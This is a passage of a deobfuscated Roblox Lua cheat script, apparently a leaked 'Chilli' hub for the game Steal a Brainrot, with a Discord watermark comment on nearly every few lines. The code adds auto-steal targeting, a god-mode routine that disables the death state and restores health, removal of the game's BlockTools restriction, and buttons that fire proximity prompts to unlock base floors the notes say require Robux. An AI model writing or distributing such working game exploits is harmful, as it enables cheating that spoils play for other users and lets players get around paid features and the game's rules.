				end)  -- LEAKED BY SLICED | discord.gg/pubmethod

				local tbl6 = {}

				if sliced27 then
					tbl6[#tbl6 + 1] = { Data = sliced27, Rank = 0 }
				end

				for i_ = 1, math.min(slicedn19, #tbl5) do
					tbl6[#tbl6 + 1] = { Data = tbl5[i_], Rank = i_ }
				end

				local str5 = tostring(prompt2)

				for _, sliced28 in ipairs(tbl6) do
					str5 ..= "|" .. tostring(sliced28.Data.Podium.Prompt) .. ":" .. tostring(sliced28.Rank)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				local flag11 = str5 ~= str3
				str3 = str5

				if sliced17 then
					sliced17.Text = plot and string.format("%d brainrot here", #tbl5) or "walk into a base"
				end

				slicedn23 = #tbl6
				sliced25 = plot
				slicedfn33()
				if flag9 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					return
				end

				for i_, sliced28 in ipairs(tbl4) do
					local sliced29 = tbl6[i_]

					if not sliced29 then
						sliced28.Row.Visible = false
						sliced28.Prompt = nil
						sliced28.RowKey = nil
						sliced28.Clone = nil
						sliced28.Track = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
						sliced28.SourceTrack = nil
					else
						local podium = sliced29.Data.Podium
						local text = tostring(podium.Prompt.ObjectText or "")
						sliced28.Row.Visible = true
						sliced28.Prompt = podium.Prompt
						sliced28.RowKey = tostring(podium.Prompt) .. ":" .. tostring(sliced29.Rank)

						if sliced29.Rank == 0 then
							sliced28.Rank.Text = "NEAR"
							sliced28.Rank.TextColor3 = Color3.fromRGB(125, 205, 255)  -- LEAKED BY SLICED | discord.gg/pubmethod
						else
							sliced28.Rank.Text = "#" .. sliced29.Rank
							sliced28.Rank.TextColor3 = Color3.fromRGB(255, 214, 84)
						end

						sliced28.NameLabel.Text = text
						chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle(sliced28.NameStyle, sliced29.Data.Generation)
						sliced28.ValueLabel.Text = slicedfn8(sliced29.Data.Generation)

						if flag11 then
							local sliced30 = slicedfn34(podium.Spawn, text)
							local mutation = sliced30 and sliced30:FindFirstChild("Mutation")  -- LEAKED BY SLICED | discord.gg/pubmethod

							if mutation and mutation:IsA("TextLabel") and mutation.Visible and tostring(mutation.Text) ~= "" then
								sliced28.MutationLabel.Text = mutation.Text
								sliced28.MutationLabel.TextColor3 = mutation.TextColor3
								sliced28.MutationLabel.RichText = mutation.RichText
							else
								sliced28.MutationLabel.Text = ""
							end

							slicedfn42(sliced28, sliced30)
						end

						slicedfn40(sliced28, podium.Plot, podium.Spawn, text, podium.Prompt)  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end

				slicedfn37()
			end

			slicedfn4(RunService.Heartbeat:Connect(function()
				if flag2 then
					slicedfn43()
				end
			end))

			local slicedn24 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn4(RunService.Heartbeat:Connect(function()
				if not (flag2 and flag10 and screenGui3) then
					return
				end
				local now = os.clock()
				if now < slicedn24 then
					return
				end
				slicedn24 = now + 0.25
				slicedfn41()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end))

			sliced12:CreateToggle({
				Name = "Show Auto Steal Bar",
				Note = "Shows the current Auto Steal target and hold progress.",
				Default = true,
				Quick = false,
				SubOf = sliced14,
				Callback = function(arg)
					flag5 = arg == true
					slicedfn26()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end,
			})

			sliced12:CreateToggle({
				Name = "Show Distance Meter",
				Note = "Adds a live distance row to the bar, measured against Auto Steal Distance.",
				Default = false,
				Quick = false,
				SubOf = sliced14,
				Callback = function(arg)
					slicedfn24(arg == true)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end,
			})

			sliced12:CreateSlider({
				Name = "Base Panel Size",
				Note = "Scales the Base Target Panel.",
				Min = 60,
				Max = 160,
				Default = 85,
				AllowDecimals = false,
				Increment = 1,  -- LEAKED BY SLICED | discord.gg/pubmethod
				Unit = "%",
				Quick = false,
				Callback = function(arg)
					slicedn20 = math.clamp((tonumber(arg) or 100) / 100, 0.6, 1.6)

					if sliced19 then
						sliced19()
					end
				end,
			})

			local sliced26 = sliced12:CreateToggle({  -- LEAKED BY SLICED | discord.gg/pubmethod
				Name = "Base Target Panel",
				Note = "Lists the nearest and highest Brainrots in this base; pick one to take it first.",
				Default = true,
				Quick = false,
				Callback = function(arg)
					flag10 = arg == true

					if not flag10 then
						slicedfn29()
					end
				end,  -- LEAKED BY SLICED | discord.gg/pubmethod
			})

			sliced12:CreateDropdown({
				Name = "Base Target Count",
				Options = { "1", "2", "3", "4", "5" },
				Default = "3",
				Quick = false,
				SubOf = sliced26,
				Callback = function(arg)
					local slicedn25 = math.clamp(math.floor(tonumber(arg) or 5), 1, 5)
					if slicedn19 == slicedn25 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return
					end
					slicedn19 = slicedn25
					str3 = ""
					slicedn21 = -math.huge

					if flag10 then
						slicedfn43()
					end
				end,
			})  -- LEAKED BY SLICED | discord.gg/pubmethod

			sliced12:CreateButton({
				Name = "Pick Nearest Target",
				ButtonText = "Pick",
				Note = "Targets the closest Brainrot; bind a key to it for one-press picking.",
				Quick = false,
				SubOf = sliced26,
				Callback = function()
					local character_ = localPlayer.Character
					character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
					if not character_ then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return
					end
					slicedfn9(false)
					local sliced27 = nil
					local sliced28 = nil

					for _, sliced29 in ipairs(tbl3) do
						local prompt3 = sliced29.Prompt
						local parent = prompt3.Parent

						if parent then
							parent = tostring(prompt3.ObjectText or "") ~= ""  -- LEAKED BY SLICED | discord.gg/pubmethod
						end

						if parent then
							local magnitude = (character_.Position - sliced29.Spawn.Position).Magnitude

							if not sliced27 or magnitude < sliced27 then
								sliced27 = magnitude
								sliced28 = sliced29
							end
						end
					end

					if not sliced28 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return
					end
					prompt2 = sliced28.Prompt
					str4 = tostring(sliced28.Prompt.ObjectText or "")
					slicedfn27()
					str3 = ""
					slicedfn37()
				end,
			})

			sliced12:CreateButton({  -- LEAKED BY SLICED | discord.gg/pubmethod
				Name = "Clear Picked Target",
				ButtonText = "Clear",
				Note = "Drops the picked Brainrot and returns to Nearest or Highest.",
				Quick = false,
				SubOf = sliced26,
				Callback = function()
					prompt2 = nil
					str4 = ""
					str3 = ""
					slicedfn37()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end,
			})
		end

		do
			local slicedn22 = 0.05
			local slicedn23 = 22
			local slicedn24 = 9
			local sliced20 = nil
			local slicedn25 = -math.huge
			local slicedn26 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
			local flag11 = false
			local sliced21 = nil

			slicedfn4(RunService.RenderStepped:Connect(function(deltaTime)
				if flag2 and flag3 then
					slicedfn23(deltaTime)
				elseif sliced13 then
					slicedfn22()
				end

				if not flag2 or not flag3 or not flag5 then
					sliced20 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
					return
				end
				local now = os.clock()

				if now - slicedn25 >= slicedn22 then
					slicedn25 = now
					local str4, str5, generation

					if flag7 or localPlayer:GetAttribute("Stealing") == true then
						slicedn26 = 0
						str4 = "GET READY - carrying brainrot"
						str5 = ""  -- LEAKED BY SLICED | discord.gg/pubmethod
						generation = nil
					else
						local character_ = localPlayer.Character
						character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

						if character_ then
							local sliced22, sliced23

							if flag4 then
								local sliced24, sliced25, sliced26
								sliced24, sliced25, sliced22, sliced26, sliced23 = slicedfn18(character_)
							else  -- LEAKED BY SLICED | discord.gg/pubmethod
								local sliced24, sliced25, sliced26, sliced27
								sliced24, sliced25, sliced26, sliced27, sliced23 = slicedfn18(character_)
								sliced22 = slicedfn11(character_) or sliced25 or sliced27
							end

							if sliced22 then
								str4 = sliced22.Name
								str5 = slicedfn8(sliced22.Generation)
								generation = sliced22.Generation
								local slicedn27 = math.max(tonumber(slicedn3) or 20, 1)
								slicedn26 = 1 - math.clamp(sliced22.Distance / slicedn27, 0, 1)  -- LEAKED BY SLICED | discord.gg/pubmethod

								if visible then
									str4 = string.format("%s   %.0f/%d", sliced22.Name, sliced22.Distance, slicedn27)
								end

								local slicedn28 = 10

								pcall(function()
									slicedn28 = sliced22.Prompt.MaxActivationDistance
								end)

								flag11 = sliced22.Distance <= slicedn28
							else
								str4 = sliced23 == 0 and "no steal prompts" or ""  -- LEAKED BY SLICED | discord.gg/pubmethod
								slicedn26 = 0
								flag11 = false
								str5 = ""
								generation = nil
							end
						else
							slicedn26 = 0
							flag11 = false
							str4 = ""
							str5 = ""  -- LEAKED BY SLICED | discord.gg/pubmethod
							generation = nil
						end
					end

					local str6 = tostring(str4) .. "\0" .. tostring(str5)

					if str6 ~= sliced20 then
						sliced20 = str6
						slicedfn25(str4, str5, generation)
					end
				end

				if flag8 and localPlayer:GetAttribute("Stealing") == true then  -- LEAKED BY SLICED | discord.gg/pubmethod
					flag8 = false
				end

				local slicedn27 = 0

				if flag8 then
					slicedn27 = math.clamp((now - slicedn8) / slicedn9, 0, 1)
				end

				local slicedn28 = math.min(deltaTime or 0.016, 0.1)
				slicedn10 += (slicedn27 - slicedn10) * (1 - math.exp(-slicedn28 * slicedn23))

				if slicedn27 <= 0 and slicedn10 < 0.002 then
					slicedn10 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				frame2.Size = UDim2.new(slicedn10, 0, 1, 0)

				if visible then
					slicedn11 += (slicedn26 - slicedn11) * (1 - math.exp(-slicedn28 * slicedn24))
					frame3.Size = UDim2.new(slicedn11, 0, 1, 0)

					if flag11 ~= sliced21 then
						sliced21 = flag11
						frame3.BackgroundTransparency = flag11 and 0.35 or 0.62
					end
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end))
		end

		local function slicedfn30()
			if not flag2 then
				return
			end
			flag2 = false
			flag3 = false
			flag7 = false
			slicedn5 += 1  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn20()
			slicedfn6()
			slicedfn22()
			slicedfn29()
			slicedfn28()

			if screenGui2 then
				pcall(function()
					screenGui2:Destroy()
				end)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if screenGui then
				pcall(function()
					screenGui:Destroy()
				end)
			end
		end

		bindableEvent.Event:Connect(slicedfn30)
		folder.Destroying:Connect(slicedfn30)

		do
			local flag11 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
			local flag12 = false
			local slicedn22 = 0
			local connection2 = nil
			local chilliDropBrainrotRuntime = CoreGui:FindFirstChild("__ChilliDropBrainrotRuntime")

			if chilliDropBrainrotRuntime then
				local cleanup = chilliDropBrainrotRuntime:FindFirstChild("Cleanup")

				if cleanup and cleanup:IsA("BindableEvent") then
					pcall(function()
						cleanup:Fire()
					end)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				pcall(function()
					chilliDropBrainrotRuntime:Destroy()
				end)
			end

			local folder2 = Instance.new("Folder")
			folder2.Name = "__ChilliDropBrainrotRuntime"
			folder2.Archivable = false
			folder2.Parent = CoreGui
			local bindableEvent2 = Instance.new("BindableEvent")  -- LEAKED BY SLICED | discord.gg/pubmethod
			bindableEvent2.Name = "Cleanup"
			bindableEvent2.Parent = folder2

			local function slicedfn31(arg)
				localPlayer:SetAttribute("ChilliDropBrainrotActive", arg == true)
			end

			local function slicedfn32(arg, arg2)
				return flag11 and arg == slicedn22 and localPlayer.Character == arg2
			end

			local function slicedfn33()
				if flag12 or localPlayer:GetAttribute("Stealing") ~= true then  -- LEAKED BY SLICED | discord.gg/pubmethod
					return
				end
				local character_ = localPlayer.Character
				local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not humanoid or not humanoidRootPart then
					return
				end
				slicedn22 += 1
				local sliced20 = slicedn22  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag12 = true
				slicedfn31(true)

				task.spawn(function()
					local cFrame = humanoidRootPart.CFrame
					local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
					local health = humanoid.Health
					local breakJointsOnDeath = humanoid.BreakJointsOnDeath
					local requiresNeck = humanoid.RequiresNeck
					local flag13 = true

					pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
						flag13 = humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead)
						humanoid.BreakJointsOnDeath = false
						humanoid.RequiresNeck = false
						humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
					end)

					local connection3 = humanoid.HealthChanged:Connect(function(health2)
						if slicedfn32(sliced20, character_) and health2 <= 0 then
							pcall(function()
								humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
							end)  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					end)

					pcall(function()
						local now = os.clock()

						while slicedfn32(sliced20, character_) and humanoidRootPart.Parent and humanoid.Parent and os.clock() - now < 0.35 do
							if humanoid.Health <= 0 then
								humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
							end

							humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 1000, 0)
							humanoidRootPart.CFrame = cFrame  -- LEAKED BY SLICED | discord.gg/pubmethod
							task.wait()
						end

						if slicedfn32(sliced20, character_) and humanoidRootPart.Parent then
							humanoidRootPart.CFrame = cFrame
							humanoidRootPart.AssemblyLinearVelocity = assemblyLinearVelocity
						end

						local now2 = os.clock()

						while slicedfn32(sliced20, character_) and humanoid.Parent and localPlayer:GetAttribute("Stealing") == true and os.clock() - now2 < 1.5 do
							if humanoid.Health <= 0 then
								humanoid.Health = math.max(humanoid.MaxHealth, health, 1)  -- LEAKED BY SLICED | discord.gg/pubmethod
							end

							task.wait()
						end
					end)

					if connection3 then
						connection3:Disconnect()
					end

					if localPlayer.Character == character_ and humanoid.Parent then
						pcall(function()
							humanoid.BreakJointsOnDeath = breakJointsOnDeath  -- LEAKED BY SLICED | discord.gg/pubmethod
							humanoid.RequiresNeck = requiresNeck
							humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, flag13)

							if health > 0 and humanoid.Health <= 0 then
								humanoid.Health = health
							end
						end)
					end

					if sliced20 == slicedn22 then
						flag12 = false

						if flag11 then  -- LEAKED BY SLICED | discord.gg/pubmethod
							slicedfn31(false)
						end
					end
				end)
			end

			local function slicedfn34()
				if not flag11 then
					return
				end
				flag11 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedn22 += 1
				flag12 = false
				slicedfn31(false)

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end

			slicedfn31(false)

			connection2 = localPlayer.CharacterAdded:Connect(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedn22 += 1
				flag12 = false
				slicedfn31(false)
			end)

			bindableEvent2.Event:Connect(slicedfn34)
			folder2.Destroying:Connect(slicedfn34)
			sliced12:CreateButton({ Name = "Drop Brainrot", ButtonText = "Drop", Callback = slicedfn33 })
		end

		sliced10 = Helper:CreateSection({ Name = "Helper", Expanded = true })
		sliced11 = Helper:CreateSection({ Name = "Aimbot", Expanded = true })  -- LEAKED BY SLICED | discord.gg/pubmethod
		sliced5 = Helper:CreateSection({ Name = "Movement & Combat", Expanded = true })
		local sliced20 = Helper:CreateSection({ Name = "Unlock Base", Expanded = true })
		local flag11 = false
		local folder2

		do
			local sliced21 = CoreGui

			pcall(function()
				if type(gethui) == "function" then
					local hui = gethui()

					if typeof(hui) == "Instance" then  -- LEAKED BY SLICED | discord.gg/pubmethod
						sliced21 = hui
					end
				end
			end)

			local chilliUnlockBaseRuntime = sliced21:FindFirstChild("__ChilliUnlockBaseRuntime")

			if chilliUnlockBaseRuntime then
				local cleanup = chilliUnlockBaseRuntime:FindFirstChild("Cleanup")

				if cleanup and cleanup:IsA("BindableEvent") then
					pcall(function()
						cleanup:Fire()  -- LEAKED BY SLICED | discord.gg/pubmethod
					end)
				end

				pcall(function()
					chilliUnlockBaseRuntime:Destroy()
				end)
			end

			folder2 = Instance.new("Folder")
			folder2.Name = "__ChilliUnlockBaseRuntime"
			folder2.Archivable = false
			folder2.Parent = sliced21  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		do
			local bindableEvent2 = Instance.new("BindableEvent")
			bindableEvent2.Name = "Cleanup"
			bindableEvent2.Parent = folder2

			local function slicedfn31()
				local character_ = localPlayer.Character
				if not character_ then
					return nil
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
				return character_:FindFirstChild("HumanoidRootPart") or character_:FindFirstChild("UpperTorso")
			end

			local function slicedfn32()
				return Workspace:FindFirstChild("Plots")
			end

			local function slicedfn33(arg, arg2)
				local slicedn22 = arg.X - arg2.X
				local slicedn23 = arg.Z - arg2.Z
				return math.sqrt(slicedn22 * slicedn22 + slicedn23 * slicedn23)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			local function slicedfn34(arg, arg2)
				local animalPodiums = arg:FindFirstChild("AnimalPodiums")
				local huge = math.huge

				if animalPodiums then
					for _, child in ipairs(animalPodiums:GetChildren()) do
						local base = child:FindFirstChild("Base")
						base = base and base:FindFirstChild("Spawn")

						if base and base:IsA("BasePart") then
							huge = math.min(huge, slicedfn33(arg2, base.Position))
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end

				if huge == math.huge then
					local ok, result = pcall(function()
						return arg:GetPivot()
					end)

					if ok then
						huge = slicedfn33(arg2, result.Position)
					end
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				return huge
			end

			local function slicedfn35()
				local sliced21 = slicedfn31()
				local sliced22 = slicedfn32()
				if not sliced21 or not sliced22 then
					return nil
				end
				local huge = math.huge
				local sliced23 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod

				for _, child in ipairs(sliced22:GetChildren()) do
					local sliced24 = slicedfn34(child, sliced21.Position)

					if sliced24 < huge then
						huge = sliced24
						sliced23 = child
					end
				end

				return sliced23
			end

			local function slicedfn36(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
				local sliced21 = slicedfn32()

				while arg and arg ~= Workspace do
					if arg.Parent == sliced21 then
						return arg
					end
					arg = arg.Parent
				end

				return nil
			end

			local function slicedfn37(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg = arg and arg:FindFirstChild("AnimalPodiums")
				local tbl5 = {}
				if not arg then
					return tbl5
				end

				for _, child in ipairs(arg:GetChildren()) do
					local base = child:FindFirstChild("Base")
					base = base and base:FindFirstChild("Spawn")

					if base and base:IsA("BasePart") then
						local y = base.Position.Y  -- LEAKED BY SLICED | discord.gg/pubmethod
						local flag12 = false

						for _, sliced21 in ipairs(tbl5) do
							if math.abs(sliced21 - y) < 1 then
								flag12 = true
								break
							end
						end

						if not flag12 then
							tbl5[#tbl5 + 1] = y
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end

				table.sort(tbl5)
				return tbl5
			end

			local function slicedfn38(arg, arg2)
				local animalPodiums = arg2 and arg2:FindFirstChild("AnimalPodiums")

				while arg and arg ~= arg2 do
					if arg.Parent == animalPodiums then
						local base = arg:FindFirstChild("Base")  -- LEAKED BY SLICED | discord.gg/pubmethod
						base = base and base:FindFirstChild("Spawn")
						if base and base:IsA("BasePart") then
							return base.Position.Y
						end
						return nil
					end

					arg = arg.Parent
				end

				return nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			local function slicedfn39(arg, arg2)
				local sliced21 = slicedfn37(arg2)
				local sliced22 = slicedfn38(arg, arg2)

				if sliced22 and #sliced21 > 0 then
					local huge = math.huge
					local slicedn22 = 1

					for i_, sliced23 in ipairs(sliced21) do
						local slicedn23 = math.abs(sliced22 - sliced23)

						if slicedn23 < huge then
							huge = slicedn23  -- LEAKED BY SLICED | discord.gg/pubmethod
							slicedn22 = i_
						end
					end

					return math.clamp(slicedn22, 1, 3)
				end

				local sliced23 = slicedfn31()
				if not sliced23 or #sliced21 == 0 then
					return 1
				end
				local y = sliced21[1]  -- LEAKED BY SLICED | discord.gg/pubmethod

				local ok, result = pcall(function()
					return arg2:GetPivot()
				end)

				if ok then
					y = result.Position.Y
				end

				local slicedn22 = sliced21[1] - y
				local slicedn23 = 1

				for i_ = 2, math.min(#sliced21, 3) do
					if sliced21[i_] - slicedn22 <= sliced23.Position.Y then  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedn23 = i_
					end
				end

				return slicedn23
			end

			local function slicedfn40(arg)
				arg = arg and arg:FindFirstChild("Unlock")
				local tbl5 = {}
				if not arg then
					return tbl5  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				for _, child in ipairs(arg:GetChildren()) do
					local position

					if child:IsA("Model") then
						local ok, result = pcall(function()
							return child:GetPivot()
						end)

						position = nil

						if ok then
							position = result.Position  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					else
						position = nil

						if child:IsA("BasePart") then
							position = child.Position
						end
					end

					if position then
						tbl5[#tbl5 + 1] = { Instance = child, Y = position.Y }
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				table.sort(tbl5, function(arg2, arg3)
					return arg2.Y < arg3.Y
				end)

				return tbl5
			end

			local function slicedfn41(arg, arg2)
				local fireproximityprompt = fireproximityprompt
				if type(fireproximityprompt) ~= "function" then
					return false  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
				local sliced22 = slicedfn40(arg)[arg2]
				if not sliced22 then
					return false
				end
				local flag12 = false

				for _, descendant in ipairs(sliced22.Instance:GetDescendants()) do
					if descendant:IsA("ProximityPrompt") then
						flag12 = pcall(fireproximityprompt, descendant) or flag12
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				return flag12
			end

			local function slicedfn42(arg)
				local sliced21 = slicedfn35()

				if sliced21 then
					slicedfn41(sliced21, arg)
				end
			end

			local function slicedfn43(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if not arg or not arg:IsA("ProximityPrompt") then
					return false
				end
				return string.find(string.lower(tostring(arg.ActionText or "")), "steal", 1, true) ~= nil
			end

			local connection2 = ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt3, player)
				if not flag11 or player and player ~= localPlayer or not slicedfn43(prompt3) then
					return
				end
				local sliced21 = slicedfn36(prompt3) or slicedfn35()  -- LEAKED BY SLICED | discord.gg/pubmethod
				if not sliced21 then
					return
				end
				local sliced22 = slicedfn39(prompt3, sliced21)
				task.defer(slicedfn41, sliced21, sliced22)
			end)

			local function slicedfn44(arg)
				arg._quickBarDefault = 4
				return arg
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn44(sliced20:CreateToggle({
				Name = "Auto Unlock Base",
				Note = "Unlocks the current floor when you start stealing. Requires Robux.",
				Default = false,
				Pin = true,
				QuickBar = 4,
				Callback = function(arg)
					flag11 = arg == true
				end,
			}))  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn44(sliced20:CreateButton({
				Name = "Unlock Floor 3",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 3 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					slicedfn42(3)
				end,
			}))  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn44(sliced20:CreateButton({
				Name = "Unlock Floor 2",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 2 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					slicedfn42(2)
				end,
			}))  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn44(sliced20:CreateButton({
				Name = "Unlock Floor 1",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 1 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					slicedfn42(1)
				end,
			}))  -- LEAKED BY SLICED | discord.gg/pubmethod

			local function slicedfn45()
				flag11 = false

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end

			bindableEvent2.Event:Connect(slicedfn45)
			folder2.Destroying:Connect(slicedfn45)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local chilliHelperLocalRuntime = CoreGui:FindFirstChild("__ChilliHelperLocalRuntime")

		if chilliHelperLocalRuntime then
			local cleanup = chilliHelperLocalRuntime:FindFirstChild("Cleanup")

			if cleanup and cleanup:IsA("BindableEvent") then
				pcall(function()
					cleanup:Fire()
				end)
			end

			pcall(function()
				chilliHelperLocalRuntime:Destroy()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)
		end

		do
			local folder3 = Instance.new("Folder")
			folder3.Name = "__ChilliHelperLocalRuntime"
			folder3.Archivable = false
			folder3.Parent = CoreGui
			local bindableEvent2 = Instance.new("BindableEvent")
			bindableEvent2.Name = "Cleanup"
			bindableEvent2.Parent = folder3  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag = true
			local tbl5 = {}

			slicedfn2 = function(arg)
				tbl5[#tbl5 + 1] = arg
			end

			local function slicedfn31()
				if not flag then
					return
				end
				flag = false  -- LEAKED BY SLICED | discord.gg/pubmethod

				for _, sliced21 in ipairs(tbl5) do
					pcall(sliced21)
				end

				table.clear(tbl5)
			end

			bindableEvent2.Event:Connect(slicedfn31)
			folder3.Destroying:Connect(slicedfn31)
		end

		do
			local function slicedfn31()  -- LEAKED BY SLICED | discord.gg/pubmethod
				if localPlayer:GetAttribute("BlockTools") == true then
					localPlayer:SetAttribute("BlockTools", false)
				end
			end

			slicedfn31()
			local connection2 = localPlayer:GetAttributeChangedSignal("BlockTools"):Connect(slicedfn31)

			slicedfn2(function()
				if connection2 then
					connection2:Disconnect()
					connection2 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end)
		end
	end

	tbl2 = { ProtectedHumanoid = nil, RescueSerial = 0 }

	do
		local n = 0.5
		local sliced12 = nil
		local tbl3 = nil
		local tbl4 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
		local flag2 = false
		local slicedn2 = 0

		local function slicedfn4()
			for _, sliced13 in ipairs(tbl4) do
				if sliced13.Connected then
					sliced13:Disconnect()
				end
			end

			table.clear(tbl4)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn5()
			slicedfn4()
			local sliced13 = sliced12
			local sliced14 = tbl3
			sliced12 = nil
			tbl3 = nil
			tbl2.ProtectedHumanoid = nil
			if not sliced13 or not sliced13.Parent or not sliced14 then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			pcall(function()
				sliced13.BreakJointsOnDeath = sliced14.BreakJointsOnDeath
				sliced13.RequiresNeck = sliced14.RequiresNeck
				sliced13:SetStateEnabled(Enum.HumanoidStateType.Dead, sliced14.DeadStateEnabled)
			end)
		end

		local function slicedfn6(arg)
			if not arg or not arg.Parent then
				return false
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			return pcall(function()
				arg.BreakJointsOnDeath = false
				arg.RequiresNeck = false
				arg:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
			end) and arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
		end

		local function slicedfn7(arg)
			if arg ~= sliced12 or not arg or not arg.Parent or flag2 then
				return false
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			local maxHealth = arg.MaxHealth
			if maxHealth <= 0 then
				return false
			end

			if maxHealth == math.huge or arg.Health >= maxHealth then
				return true
			end
			local flag3 = arg.Health <= 0
			flag2 = true

			local ok = pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.Health = maxHealth
			end)

			flag2 = false

			if ok and flag3 and arg.Health > 0 then
				tbl2.RescueSerial = tbl2.RescueSerial + 1
			end

			return ok and arg.Health >= maxHealth
		end

		local function slicedfn8(arg)
			slicedfn5()  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not flag or not arg or arg ~= localPlayer.Character then
				return false
			end
			local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			if not flag or arg ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
				return false
			end
			sliced12 = humanoid
			tbl2.ProtectedHumanoid = humanoid

			tbl3 = {  -- LEAKED BY SLICED | discord.gg/pubmethod
				BreakJointsOnDeath = humanoid.BreakJointsOnDeath,
				RequiresNeck = humanoid.RequiresNeck,
				DeadStateEnabled = humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead),
			}

			if not slicedfn6(humanoid) or not slicedfn7(humanoid) then
				slicedfn5()
				return false
			end

			tbl4[#tbl4 + 1] = humanoid.HealthChanged:Connect(function()
				slicedfn7(humanoid)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)

			tbl4[#tbl4 + 1] = humanoid:GetPropertyChangedSignal("MaxHealth"):Connect(function()
				slicedfn7(humanoid)
			end)

			tbl4[#tbl4 + 1] = humanoid.StateChanged:Connect(function(old, new)
				if new == Enum.HumanoidStateType.Dead then
					slicedfn6(humanoid)
					slicedfn7(humanoid)
				end
			end)  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedn2 = os.clock()
			return true
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character_)
			slicedfn8(character_)
		end)

		local connection2 = RunService.Heartbeat:Connect(function()
			local now = os.clock()

			if sliced12 and now - slicedn2 >= n then
				slicedn2 = now  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn6(sliced12)
				slicedfn7(sliced12)
			end
		end)

		task.spawn(function()
			slicedfn8(localPlayer.Character)
		end)

		slicedfn2(function()
			slicedfn5()

			if connection then  -- LEAKED BY SLICED | discord.gg/pubmethod
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end
		end)
	end

	local slicedfn4, slicedfn5  -- LEAKED BY SLICED | discord.gg/pubmethod
	local n = 2

	slicedfn4 = function(arg)
